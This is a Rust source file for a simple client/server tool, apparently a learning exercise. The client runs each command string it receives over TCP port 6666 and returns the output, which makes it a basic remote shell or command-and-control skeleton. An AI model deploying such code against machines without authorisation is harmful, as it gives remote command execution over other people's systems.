
// module containing functions to instpect various aspects of environment including processing args. 
use std::env;

// Imports for Server & client function
use std::thread;
use std::net::{TcpListener, TcpStream, Shutdown};
use std::io::{self, Read, Write};

// For OS commands
use std::process::{Command, Stdio};


fn main() {

    //println!("Hello, world!");

    // use collect() to turn the iterator into a vector containing all the values produced by the iterator. 
    let args: Vec<String> = env::args().collect();

    // print the vector using the debug macro
    //dbg!(args);

    if args.len() < 2 {
        println!("<!> args accepts 'server' or 'client'");
        return;
    }

    // Here we will match either 'server' or 'client' input and direct to new functions accordingly.

    // args[0] in rust is reserved for the program name or path. 
    match args[1].as_str() {
        "server" => server(),
        "client" => client(),
        _ => println!("<!> args accept 'server' or 'client'"),
    }
    

}

fn server() {

    println!("in server block");

    // setup tcp listener on port 6666
    // unwrap is a way to handle errors, if an error is passed the program will panic 
    let listener = TcpListener::bind("0.0.0.0:6666").unwrap();

    println!("Server up on port 6666");
    // accept connections and process them serially
    for stream in listener.incoming() {

        match stream{

            Ok(stream) => {
                
                // Returns the socket address of the remote peer of this TCP connection.
                println!("New connection: {}", stream.peer_addr().unwrap());

                // Creating a thread.
                // inported std::thread
                // Threads are ment to communicate with channels. 
                // using 'move ||' gives ownership of values to a thread. 
                thread::spawn(move|| {
                    handle_client(stream)
                }); 

            }
            Err(e) => {

                println!("Error: {}", e);
                // connection failed 
            }
        }
        
        
    }
    // close the socket 
    // Outside of the loop
    drop(listener);
}

fn client() {

    println!("in client block");

    match TcpStream::connect("localhost:6666") {

        Ok(mut stream) => {

            println!(".> Successful connection");
            
            loop {
                //set a 50 byte buffer
                let mut buffer = [0 as u8; 50];

                match stream.read(&mut buffer) {
                    Ok(size) if size > 0 => {

                        let received = &buffer[0..size]; // slice the buffer to the actual received size.

                        match String::from_utf8(received.to_vec()) {
                           
                            Ok(command) => {

                                println!(".> Recieved command: {}", command.trim());

                                //process command here using OS commands
                                //let output = Command::new(command).stdout(Stdio::piped()).output().unwrap();

                                // This match ensures that even if there is an error on the client side , the connection will not close
                                // this replaced the .unwrap() function. 
                                match Command::new(command.clone()).stdout(Stdio::piped()).output() {
                                    Ok(output) => {
                                        if output.status.success() {
                                            let stdout = String::from_utf8_lossy(&output.stdout);
                                            //println!(".> Command output: \n{}", stdout);
                                            stream.write(stdout.as_bytes()).unwrap();

                                        } else {
                                            let stderr = String::from_utf8_lossy(&output.stderr);
                                            println!("!> Command failed: {}", stderr);
                                        }
                                    }
                                    Err(e) => {

                                        let error_msg = format!("\n!> {}\n", e);

                                        stream.write_all(error_msg.as_bytes()).unwrap();
                                    }

                                }

                                //let msg = b"DEBUG stream write DEBUG";
                                //let stdout = String::from_utf8(output.stdout).unwrap();

                                // need to fix this part, commands will fail if too large, increase buffer? also need to improve output on the server side. 

                                //stream.write(stdout.as_bytes()).unwrap();
                            } 
                           Err(_) => {
                                println!("!> Received non-UTF-8 data");
                            }
                        }

                        //println!(".> Received command: {:?}", received);
                    }
                    Ok(_) => {
                        println!("!> Server closed the connection.");
                        break; // exit loop if the server closes the connection
                    }
                    Err(e) => {
                        println!("!> Error reading from the server: {}", e);
                    }

                }

            }


        }
        Err(e) => {
            println!("!> Failed to connect: {}", e);
        }

    }
    println!("!> Terminated");

}

fn handle_client(mut stream: TcpStream) {

    println!(">> Connected to the client.");

    // Create buffer with 50 bytes
    let mut data = [0 as u8; 50];

    // loop to send commands
    loop {

        let mut input = String::new();

        //prompt for user input
        println!(".> Send a command to the client: ");

        // Call to the error first
        if let Err(e) = io::stdin().read_line(&mut input) {
            println!("!> Failed to read input: {}", e);
            continue;
        }

        let command = input.trim(); // trim newline

        // exit the loop if command is 'Exit'
        // eq_ignore_ascii_case ignores case ( exit , ExIt, EXIT ) 
        if command.eq_ignore_ascii_case("exit") {
            println!(".> exit sent. Closing connection.");
            break;
        }

        // Send the command to the client
        if let Err(e) = stream.write_all(command.as_bytes()) {
            println!("!> Failed to send command: {}", e);
            break; // exit loop if the connection is broken
        }
        println!(".> Sent command: '{}'", command);

        //Wait for response from client
        match stream.read(&mut data) {

            // DEBUG println!("#Debug# Raw bytes: {:?}", &data[0..size]);

            // if bytes sent are greater than 0 
            // from_utf8_lossy 
            Ok(size) if size > 0 => {

                // lossy converts between bytes and slice of bytes in u8
                // also trims newline or whitespace. 
                
                println!("\n{}\n", String::from_utf8_lossy(&data[0..size]).trim()); 
                
            }
            Ok(_) => {
                println!("!> Client closed the connection.");
                break;
            }
            Err(e) => {
                println!("!> Error reading response: {}", e);
                break;
            }

        }


    } 

    if let Err(e) = stream.shutdown(Shutdown::Both) {
        println!("!> Error shutting down conenction: {}", e);
    }
}




